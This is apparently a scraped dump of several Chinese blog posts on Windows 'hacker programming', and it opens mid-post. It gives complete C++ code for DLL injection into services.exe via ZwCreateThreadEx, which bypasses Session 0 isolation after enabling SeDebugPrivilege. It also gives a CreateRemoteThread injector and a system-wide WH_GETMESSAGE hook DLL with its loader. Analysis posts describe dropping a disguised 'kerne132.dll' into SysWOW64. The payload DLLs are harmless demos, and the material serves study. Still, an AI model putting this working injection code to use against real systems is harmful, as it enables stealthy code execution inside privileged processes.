0。这些一起运行的服务与应用程序，由于服务是以最高权限进行运行的，所以造成一些安全风险，恶意代码可以利用这点来提升自己的权限。 在Visita中，服务在一个叫做session0的特殊session中承载。应用程序在其他session中，这样服务与应用程序就隔离开来。这样的话，恶意代码要向注入到关键的系统服务进程中，就会因为session 0的隔离而失败。 但是直接调用zwCreateThreadEx函数可以进行远线程注入，还可以突破隔离。 实现原理实现突破SESSION 0隔离的注入技术是使用比CreateRemoteThread函数更为底层的ZwCreateThreadEx函数来创建的远线程的。因为此函数在ntdll.dll中没有声明，所以需要使用GetProcAddress从ntdll.dll中获取该函数的导出地址。 ZwCreateThreadEx函数比CreateRemoteThread函数更为底层，那么CreateRemoteThread函数最终还是通过调用ZwCreateThreadEx函数来实现远线程创建的。为什么使用CreateRemoteThread函数没有用。经过前人的跟踪与分析，发现调用ZwCreateThreadEx函数创建远线程的时候，第七个参数的值为1，这会导致创建的线程完成后一直挂起无法恢复运行，这就是为什么DLL注入失败的原因。要想成功的话，就要直接调用ZwCreateThreadEx函数，将第七个参数设置为0，这样线程创建完成之后就会恢复运行，成功注入。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#include &quot;pch.h&quot;#include &lt;Windows.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;atlconv.h&gt;#include &lt;atlstr.h&gt;BOOL CreateRemoteThreadInject(DWORD dwProcessId, WCHAR* pszDllFileName) &#123; //提升权限 HANDLE hToken; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken) == false) &#123; printf(&quot;打开近访问令牌失败\\n&quot;); return FALSE; &#125; LUID luid; if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid) == false) &#123; printf(&quot;查看特权信息失败\\n&quot;); return FALSE; &#125; TOKEN_PRIVILEGES tkp; tkp.PrivilegeCount = 1; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; tkp.Privileges[0].Luid = luid; if (false == AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) &#123; printf(&quot;调节权限失败\\n&quot;); return FALSE; &#125; HANDLE hProcess = NULL; DWORD dwSize = 0; LPVOID pDllAddr = NULL; FARPROC pFuncProcAddr = NULL; //获取注入进程句柄 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); return FALSE; &#125; dwSize = lstrlen(pszDllFileName) + 1; //printf(&quot;dwSize:%d\\n&quot;, dwSize); //申请内存 pDllAddr = VirtualAllocEx(hProcess, NULL, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); if (pDllAddr == NULL) &#123; printf(&quot;申请内存失败\\n&quot;); return FALSE; &#125; //向申请的内存写入数据 BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * 2, NULL); if (WriteFlag == NULL) &#123; printf(&quot;写入内存失败\\n&quot;); return FALSE; &#125; HMODULE hNtdll = LoadLibrary(L&quot;ntdll.dll&quot;); if (hNtdll == NULL) &#123; printf(&quot;获取NTDLL地址失败\\n&quot;); return FALSE; &#125; //获取loadlibrary pFuncProcAddr = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;); if (pFuncProcAddr == NULL) &#123; printf(&quot;获取loadlibrary地址失败\\n&quot;); return FALSE; &#125;#ifdef _WIN64 typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown);#else typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown);#endif typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, &quot;ZwCreateThreadEx&quot;); if (ZwCreateThreadEx == NULL) &#123; printf(&quot;获取ZW地址失败\\n&quot;); return FALSE; &#125; HANDLE hRemoteThread = NULL; ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, 0, 0, 0, NULL); if (hRemoteThread == NULL) &#123; printf(&quot;创建失败\\n&quot;); return FALSE; &#125; CloseHandle(hProcess); FreeLibrary(hNtdll); return TRUE;&#125;DWORD GetPID(char* pszProcessName) &#123; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe = &#123; sizeof(pe) &#125;;//初始化 USES_CONVERSION; CString ProcessName = A2T(pszProcessName); BOOL flag = Process32First(hSnap, &amp;pe); while (flag) &#123; if (lstrcmp(pe.szExeFile, ProcessName) == 0) &#123; return pe.th32ProcessID; &#125; flag = Process32Next(hSnap, &amp;pe); &#125; CloseHandle(hSnap); return 0;&#125;int main() &#123; printf(&quot;按下回车开始注入\\n&quot;); getchar(); DWORD dwPID = GetPID(&quot;services.exe&quot;); bool flag = CreateRemoteThreadInject(dwPID, L&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\RemoteTest.dll&quot;); if (flag == FALSE) &#123; printf(&quot;注入失败\\n&quot;); &#125; else printf(&quot;注入成功\\n&quot;); getchar(); return 0;&#125; 效果查看尝试注入SESSION 0的service.exe，使用Process Explorer可以看到services.exe的相关信息 打开程序，按下回车开始注入，显示注入成功 使用Process Explorer查看services.exe的导入模块 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ackie.cn/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"注入技术-远程线程注入","slug":"注入技术-远程线程注入","date":"2021-07-12T03:56:15.000Z","updated":"2021-08-09T10:53:11.544Z","comments":true,"path":"2021/07/12/注入技术-远程线程注入/","link":"","permalink":"https://b1ackie.cn/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/","excerpt":"","text":"远程线程注入远程线程注入是指一个进程在另一个进程中创建线程的技术。 函数介绍OpenProcess打开现有的本地进程对象 12345HANDLE OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId); dwDesiredAccess：访问进程对象。此访问权限为针对进程的安全描述符进行检查，此参数可以是一个或者多个进程访问权限。如果调用了该函数的进程启用了SeDebugPrivilege权限，则无论安全描述符的内容是什么，它都会授予所请求的访问权限。 bInheritHandle：若此值为TRUE，则此进程创建的进程将继承该句柄。否则，进程不会进程此句柄。 dwProcessId：要打开的本地进程PID。 返回值：如果函数成功，则返回值是指定进程的打开句柄；如果失败，则返回值为NULL。 VirtualAllocEx在指定进程的虚拟地址空间内保留、提交或更改内存的状态。 1234567LPVOID VirtualAllocEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); hProcess：进程的句柄。此函数在该进程的虚拟地址空间内分配内存，句柄必须具有PROCESS_VM_OPERATION访问权限。 lpAddress：指定要分配页面所需起始地址的指针。如果为NULL，则该函数自动分配内存。 dwSize：要分配的内存大小，以字节为单位。 flAllocationType：内存分配类型。此参数必须为以下值之一。 值 含义 MEM_COMMIT0x00001000 在磁盘的分页文件和整体内存中，为指定的预留内存页分配内存 MEM_RESERVE0x00002000 保留进程中虚拟地址空间的范围，但不会在内存或磁盘上的分页文件中分配任何实际物理存储位置 MEM_RESET0x00080000 表示不再关注由lpAddress和dwSize指定的内存范围内的数据，页面不应从页面文件中读取或写入。 MEM_RESET_UNDO0x1000000 只能在早期成功应用了MEM_RESET的地址范围内调用MEM_RESET_UNDO flProtect：要分配的页面区域的内存保护。如果页面已提交，则可以指定任何一个内存保护常量。如果lpAddress指定了一个地址，则flProtect不能是以下任何值： PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE 返回值：如果函数成功，则返回值是分配页面的基址；如果失败，则返回为NULL。 WriteProcessMemory在指定的进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败。 1234567BOOL WriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten); hProcess：要修改的进程内存的句柄。句柄必须具有PROCESS_VM_WRITE和PROCESS_VM_OPERATION访问权限。 lpBaseAddress：指向指定进程中写入数据的基地址指针。在数据传输发生之前，系统会验证指定大小的基地址和内存中的所有数据是否可以进行写入访问，如果不可以访问，则该函数将失败。 lpBuffer：指向缓冲区的指针，其中包含要写入指定进程的地址空间中的数据。 nSize：要写入指定进程的字节数。 lpNumberOfBytesWritten：指向变量的指针，该变量接受传输到指定进程的字节数。如果为NULL，则忽略该参数。 返回值：如果函数成功，则返回值不为0；如果失败，则为0； CreateRemoteThread创建一个在另一个进程的虚拟地址空间中运行的线程。 123456789HANDLE CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); hProcess：要创建线程的进程的句柄。句柄必须具有PROCESS_CREATE_THREAD、PROCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PROCESS_VM_READ访问权限。 lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符，并确定子进程是否可以继承返回的句柄。如果为NULL，则线程将会获得默认的安全描述符，并且不能继承该句柄。 dwStackSize：堆栈的初始大小，以字节为单位。如果参数为0，则新线程使用可执行文件的默认大小。 lpStartAddress：指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中。 lpParameter：指向要传递给线程函数的变量的指针。 dwCreationFlags：控制线程创建的标志。 值 含义 0 线程在创建后立即运行 CREATE_SUSPENDED 该线程在挂起状态下创建，并且在调用ResumeThread函数之前不会运行 STACK_SIZE_PARAM_IS_A_RESERVATION 所述dwStackSize参数指定堆栈的初始保留大小。如果未指定此标志，则dwStackSize指定提交大小。 lpThreadId：指向接受线程标识符的变量的指针。如果此参数为NULL，则不返回线程标识符。 返回值：如果成功，则返回值是新线程的句柄；如果失败，则返回NULL。 实现过程RemoteThreadInject.cpp代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &quot;pch.h&quot;#include &lt;Windows.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;BOOL CreateRemoteThreadInject(DWORD dwProcessId, WCHAR* pszDllFileName) &#123; HANDLE hProcess = NULL; DWORD dwSize = 0; LPVOID pDllAddr = NULL; FARPROC pFuncProcAddr = NULL; //获取注入进程句柄 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); return FALSE; &#125; dwSize = lstrlen(pszDllFileName) + 1; //申请内存 pDllAddr = VirtualAllocEx(hProcess, NULL, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); if (pDllAddr == NULL) &#123; printf(&quot;申请内存失败\\n&quot;); return FALSE; &#125; //向申请的内存写入数据 BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * 2, NULL); if (WriteFlag == NULL) &#123; printf(&quot;写入内存失败\\n&quot;); return FALSE; &#125; //获取loadlibrary pFuncProcAddr = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;); if (pFuncProcAddr == NULL) &#123; printf(&quot;获取loadlibrary地址失败\\n&quot;); return FALSE; &#125; HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, NULL); if (hRemoteThread == NULL) &#123; printf(&quot;创建线程失败\\n&quot;); return FALSE; &#125; WaitForSingleObject(hRemoteThread, -1); DWORD code; GetExitCodeThread(hRemoteThread, &amp;code); code = GetLastError(); VirtualFreeEx(hProcess, pDllAddr, 0, MEM_RELEASE); CloseHandle(hProcess); CloseHandle(hRemoteThread); return TRUE;&#125;int main() &#123; printf(&quot;按下回车开始注入\\n&quot;); getchar(); HWND hNotepadWindow = FindWindow(L&quot;Notepad&quot;,L&quot;无标题 - 记事本&quot;); if (hNotepadWindow == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); exit(-1); &#125; DWORD dwPID = 0; GetWindowThreadProcessId(hNotepadWindow, &amp;dwPID); if (dwPID == 0) &#123; printf(&quot;获取PID失败\\n&quot;); exit(-1); &#125; bool flag = CreateRemoteThreadInject(dwPID, L&quot;自己的文件路径&quot;); if (flag == FALSE) &#123; printf(&quot;注入失败\\n&quot;); &#125; else printf(&quot;注入成功\\n&quot;); getchar(); return 0;&#125; dllmain.cpp代码如下，主要实现一个弹窗功能。 1234567891011121314151617181920// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: MessageBox(NULL, L&quot;注入成功！&quot;, L&quot;ok&quot;, MB_OK); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 效果查看先打开notepad再打开我们编写的程序，将DLL文件放在指定路径下。 开始注入，就可以看到已经成功弹出了窗口。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ackie.cn/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"病毒分析-资源释放+钩子注入","slug":"病毒分析-资源释放+钩子注入","date":"2021-07-12T02:15:02.000Z","updated":"2021-07-12T03:52:12.644Z","comments":true,"path":"2021/07/12/病毒分析-资源释放+钩子注入/","link":"","permalink":"https://b1ackie.cn/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/","excerpt":"","text":"把上次写的资源释放和全局钩子注入结合起来，做了一个小demo，实现功能就是把自己的写的DLL作为资源加入，然后自释放出来，再调用这个DLL进行钩子注入。 使用dir工具先查看一下基本信息，可以看到当前程序未加壳。 再查看一下导入表的相关信息，看看都使用了哪些API。可以看到一些资源相关API，还有Loadlibrary和getprocaddress，这两个API，写过shellcode都知道使用这两个API可以获取所有dll和其中的函数。 再查看一下字符串的一些信息，可以看到有这样一个字符串“C:\\Windows\\SysWOW64\\kerne132.dll”，可以看到这个dll和系统dll”kernel32.dll”区别是最后一位，用1代替了l。可能是一个恶意的dll被释放到了C:\\Windows\\SysWOW64\\下。 使用IDA查看一下，F5查看伪代码，可以先看到资源释放的过程，其释放了一个名为“kerne132.dll”的文件到C:\\Windows\\SysWOW64\\下。 然后调用了这个DLL里面的函数setglobalhook，从名字可以看出来，这应该是一个钩子的函数。 到目标目录下去查看一下，可以看到这个伪装成kernel32.dll的恶意dll文件。 使用IDA查看一下这个DLL文件，看一下它的导出表，可以看到导出了两个函数SetGlobalHook和UnsetGlobalHook，从名字上猜测应该是安装钩子和卸载钩子。 查看SetGlobalHook，可以看到使用了SetWindowsHookExW函数，IDHOOK的值是3,3是WH_GETMESSAGE代表这是一个全局钩子。 使用PC hunter工具可以很方便的查看是否存在钩子。","categories":[{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}]},{"title":"病毒分析-资源释放","slug":"病毒分析-资源释放","date":"2021-07-09T01:54:29.000Z","updated":"2021-07-12T02:15:39.146Z","comments":true,"path":"2021/07/09/病毒分析-资源释放/","link":"","permalink":"https://b1ackie.cn/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/","excerpt":"","text":"本篇来分析一下自己写的资源释放的小demo。 打开程序，发现没有任何改变，没有明显的行为。 使用die工具查一下文件的基本信息 查看一下导入表，可以看到FindResource等函数，这几个函数是用来操作资源的，猜测有可能是释放了一个资源节中的资源到电脑上。 还可以看到fwrite，fopen这样的函数，那么应该就是把资源释放到了一个路径中去。 可以使用resource hacker来查看程序中的资源，如图可以看到资源信息“this is a test” 再使用IDA进行查看，可以很清楚的看到所有的流程，并且看到程序将释放的文件存放在了C:\\Windows\\System32下。 因为程序是32位程序，系统是64位，所以资源会被释放到SysWOW64文件下。因为此文件夹是用来处理运行在64位系统上的32位程序的。 到路径下查找free.txt即可找到","categories":[{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}]},{"title":"注入技术-全局钩子注入","slug":"注入技术-全局钩子注入","date":"2021-07-08T09:52:07.000Z","updated":"2021-08-09T10:52:43.848Z","comments":true,"path":"2021/07/08/注入技术-全局钩子注入/","link":"","permalink":"https://b1ackie.cn/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/","excerpt":"","text":"全局钩子注入windows中大部分应用程序都是基于消息机制的，每个进程都有自己的消息队列。 局部钩子是针对某个线程的，全局钩子是作用于整个系统的基于消息的应用。全局钩子需要使用DLL文件，在DLL文件中实现相应的钩子函数。 函数介绍SetWindowsHookEx函数将程序定义的钩子函数安装到挂钩链中，安装钩子程序可以监视系统是否存在某些类型的事件，这些事件与特定线程或调用线程所在桌面中的所有线程相关联。 123456HHOOK SetWindowsHookExA( int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId); 参数idHook：要安装的钩子程序的类型，该参数具体可以见下表。 值 含义 WH_CALLWNDPROC4 安装钩子程序，在系统将消息发送到目标窗口过程之前监视消息 WH_CALLWNDPROCRET12 安装钩子程序，在目标窗口过程处理消息后监视消息 WH_CBT5 安装接受对CBT应用程序有用通知的钩子程序 WH_DEBUG9 安装可用于调试其他钩子程序的钩子程序 WH_FOREGROUNDIDLE11 安装在应用程序的前台线程即将变为空闲时调用的钩子过程，该钩子对于在空闲时执行低优先级任务很有用 WH_GETMESSAGE3 安装一个挂钩过程，它监视发送到消息队列的消息 WH_JOURNALPLAYBACK1 安装一个挂钩过程，用于发布先前由WH_JOURNALRECORD挂钩过程记录的消息 WH_JOURNALRECORD0 安装一个挂钩过程，记录发布到系统消息队列中的输入消息。这个钩子对于录制宏很有用。 WH_KEYBOARD2 安装监视按键消息的挂钩过程 WH_KEYBOARD_LL13 安装监视低级键盘输入事件的挂钩过程 WH_MOUSE7 安装监视鼠标消息的挂钩过程 WH_MOUSE_LL14 安装监视低级鼠标输入事件的挂钩过程 WH_MSGFILTER-1 安装钩子程序，用于在对话框、消息框、菜单或滚动条中监视由于输入事件而生成的消息 WH_SHELL10 安装接受对于shell应用程序有用通知的钩子程序 WH_SYSMSGFILTER6 安装钩子程序，用于在对话框、消息框、菜单或滚动条中监视由于输入事件而生成的消息，钩子程序监视与调用线程相同桌面中所有应用程序的这些消息 lpfn：一个指向钩子程序的指针。如果dwThreadId参数为0或指定由不同进程创建线程标识符，则lpfn参数必须指向DLL中的钩子过程。否则，lpfn可以指向与当前进程关联的代码中的钩子过程。 hMod：包含由lpfn参数指向的钩子过程的DLL句柄。如果dwThreadId参数指定由当前进程创建线程，并且钩子过程位于与当前进程关联的代码中，则hMod参数必须设置为NULL。 dwThreadId：与钩子程序关联的线程标识符。如果此参数为0，则钩子过程与系统中所有线程相关联。 返回值如果函数成功，则返回值是钩子过程的句柄。 如果函数失败，则返回值为NULL。 实现过程创建全局钩子，钩子函数需要在一个DLL文件中。进程的地址空间是独立的，发生对应事件的进程不能调用其他进程地址空间的钩子函数。如果钩子的实现在DLL中的话，则在对应事件发生的时候，系统会把这个DLL加载到发生事件的进程地址空间之中，使它能够调用钩子函数进行处理。创建一个全局钩子之后，在对应事件发生的时候，系统就会把DLL加载到发生事件的进程中，这样就实现了DLL注入。 设置idHook的值为WH_GETMESSAGE就可以让DLL注入到所有的进程中，因为WH_GETMESSAGE类型的钩子会监视消息队列，并且Windows系统是基于消息驱动的，所有进程都会有一个自己的消息队列，都会加载WH_GETMESSAGE类型的全局钩子DLL。 DLL文件如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;//共享内存#pragma data_seg(&quot;mydata&quot;)#pragma data_seg()#pragma comment(linker, &quot;/SECTION:mydata,RWS&quot;)HMODULE g_hDllModule = NULL;HHOOK g_hHook = NULL;// 钩子回调函数LRESULT GetMsgProc(int code, WPARAM wParam, LPARAM lParam)&#123; return CallNextHookEx(g_hHook, code, wParam, lParam);&#125;// 设置全局钩子BOOL SetGlobalHook()&#123; g_hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hDllModule, 0); if (NULL == g_hHook) &#123; return FALSE; &#125; return TRUE;&#125;// 卸载钩子BOOL UnsetGlobalHook()&#123; if (g_hHook) &#123; UnhookWindowsHookEx(g_hHook); &#125; return TRUE;&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: &#123; g_hDllModule = hModule; break; &#125; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 全局钩子是以DLL形式加载到其他进程空间之中的，且进程都是独立的，任意修改其中的一个内存里的数据是不会影响另一个进程的。所在DLL中创建了共享内存，共享内存是指突破进程独立性，多个进程共享同一段内存。在DLL中创建共享内存，就是在DLL之中创建一个变量，然后将DLL加载到多个进程空间，只要一个进程修改了该变量值，其他进程DLL中的这个值也会改变，就相当于多个进程共享一个内存。 编写一个调用DLL的程序，test.exe 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// test.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; typedef BOOL(*typedef_SetGlobalHook)(); typedef BOOL(*typedef_UnsetGlobalHook)(); HMODULE hDll = NULL; typedef_SetGlobalHook SetGlobalHook = NULL; typedef_UnsetGlobalHook UnsetGlobalHook = NULL; BOOL bRet = FALSE; printf(&quot;按下回车开始设置钩子\\n&quot;); getchar(); do &#123; hDll = LoadLibrary(L&quot;Hook.dll&quot;); if (NULL == hDll) &#123; printf(&quot;加载DLL失败\\n错误代码%d\\n&quot;, GetLastError()); break; &#125; SetGlobalHook = (typedef_SetGlobalHook)GetProcAddress(hDll, &quot;SetGlobalHook&quot;); if (NULL == SetGlobalHook) &#123; printf(&quot;获取函数地址失败\\n错误代码%d\\n&quot;, GetLastError()); break; &#125; bRet = SetGlobalHook(); if (bRet) &#123; printf(&quot;设置钩子成功\\n&quot;); &#125; else &#123; printf(&quot;设置钩子失败\\n&quot;); &#125; system(&quot;pause&quot;); UnsetGlobalHook = (typedef_UnsetGlobalHook)GetProcAddress(hDll, &quot;UnsetGlobalHook&quot;); if (NULL == UnsetGlobalHook) &#123; printf(&quot;获取函数地址失败\\n错误代码%d\\n&quot;, GetLastError()); break; &#125; UnsetGlobalHook(); printf(&quot;卸载钩子成功\\n&quot;); &#125; while (FALSE); system(&quot;pause&quot;);&#125; 效果查看可以先试用PC hunter工具进行查看，可以看到当前没有任何消息钩子存在。 打开我们的test.exe，设置好钩子之后，再进行查看，刷新一下消息钩子列表，如图可以看到已经存在了一个消息钩子。 使用OD附加打开notepad.exe，再打开模块窗口。 再打开test.exe，进行钩子设置。可以很明显看到变化，已经注入成功了。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ackie.cn/tags/%E6%B3%A8%E5%85%A5/"},{"name":"HOOK","slug":"HOOK","permalink":"https://b1ackie.cn/tags/HOOK/"}]},{"title":"资源释放","slug":"资源释放","date":"2021-07-08T03:52:26.000Z","updated":"2021-08-09T10:53:17.472Z","comments":true,"path":"2021/07/08/资源释放/","link":"","permalink":"https://b1ackie.cn/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/","excerpt":"","text":"资源释放恶意代码会广泛的使用此技术，因为它可以使程序变得简洁，提高隐蔽性。如果一个程序需要额外的加载一些DLL、文本文件或者其他类型文件，将它们可以作为资源插入到程序中，在程序运行的时候再将它们释放到本地上，这样恶意代码会更加隐蔽。 函数介绍FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置12345HRSRC FindResourceW( HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType); hModule：处理包含资源的可执行文件模块。若hModule为NULL，则系统从当前进程的模块中装载资源。 lpName：指定资源名称 lpType：指定资源类型 返回值：如果函数运行成功，那么返回值为指定资源信息块的句柄。可将这个句柄传递给其它函数获取其他信息。如果失败，则返回NULL； SizeofResource函数：获取指定资源的字节数1234DWORD SizeofResource( HMODULE hModule, HRSRC hResInfo); hModule：包含资源的可执行文件模块的句柄。若hModule为NULL，则系统从当前进程的模块中装载资源。 hResInfo：资源局部。此句柄必须由函数FindResource或FindResourceEx来出创建。 返回值：如果函数运行成功，则返回值为资源的字节数；如果函数运行失败，则返回值为0； LoadResource函数：装载指定资源到全局存储器1234HGLOBAL LoadResource( HMODULE hModule, HRSRC hResInfo); hModule：包含资源的可执行文件模块的句柄。若hModule为NULL，则系统从当前进程的模块中装载资源。 hResInfo：资源局部。此句柄必须由函数FindResource或FindResourceEx来出创建。 返回值：如果函数运行成功，则返回值为相关资源数据的句柄。如果函数运行失败，则返回值为NULL。 LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针123LPVOID LockResource( HGLOBAL hResData); hResData：装载资源的句柄。函数LoadResource可以返回这个句柄。 返回值：如果装载资源被锁住，则返回值是资源的第一个字节的指针；反之则为NULL。 实现过程创建一个test.txt文件，写入内容 在程序中添加一个自定义资源，自定义资源名称为“MYRES”，再将刚才创建的txt文件添加进去 程序实现源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// FreeRes.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &quot;resource.h&quot;//资源控件名称，资源名称，释放后的名称BOOL FreeRes(UINT uiResourceName,TCHAR* lpszResType,char* lpszSaveFileName) &#123; //获取指定模块的资源 HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(uiResourceName), lpszResType); if (hRes == NULL) &#123; MessageBox(NULL, L&quot;获取资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //获取大小 DWORD dwSize = SizeofResource(NULL, hRes); if (dwSize == 0) &#123; 